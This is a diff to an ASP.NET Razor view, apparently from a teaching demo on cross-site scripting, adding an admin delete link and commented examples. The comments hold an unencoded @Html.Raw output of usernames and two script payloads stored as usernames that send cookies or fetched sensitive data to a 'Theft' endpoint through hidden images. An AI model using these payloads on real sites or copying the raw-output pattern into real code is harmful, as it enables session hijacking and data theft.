@@ -28,7 +28,7 @@
                         <div class="col-md-10">
                             @Html.PasswordFor(m => m.Password, new { @class = "form-control" })
                             @Html.ValidationMessageFor(m => m.Password, "", new { @class = "text-danger" })
-                        </div>
+                        </div>  
                     </div>
                     <div class="form-group">
                         <div class="col-md-offset-2 col-md-10">
@@ -40,9 +40,19 @@
                     <p class="text-warning">
                         <b>List of users:</b>
                         <ul>
+                            @* XSS consequences *@
+
                             @foreach (var user in Model.Users)
                             {
-                                <li>@user.Username - @user.Balance</li>
+                                <li>@user.Username - @user.Balance
+                                    @Html.ActionLink("✘", "Delete", "Admin", new { username = user.Username }, null)
+                                </li>
+                                
+                                @* Stealing cookies or other data *@
+                                @* @Html.Raw(user.Username) *@
+                                @* Steal cookies: Joker<script>$(function () { $('<img>').attr('src', 'http://localhost:6118/Home/Theft?data=' + encodeURIComponent(document.cookie)).appendTo('body').hide(); });</script> *@
+                                
+                                @* Steal sensetive info: Joker<script>$(function () { $.get('/Home/GetSensetiveInfo', function (res) { $('<img>').attr('src', 'http://localhost:6118/Home/Theft?data=' + encodeURIComponent(res.data)).appendTo('body').hide(); }); });</script> *@
                             }
                         </ul>
                     </p>
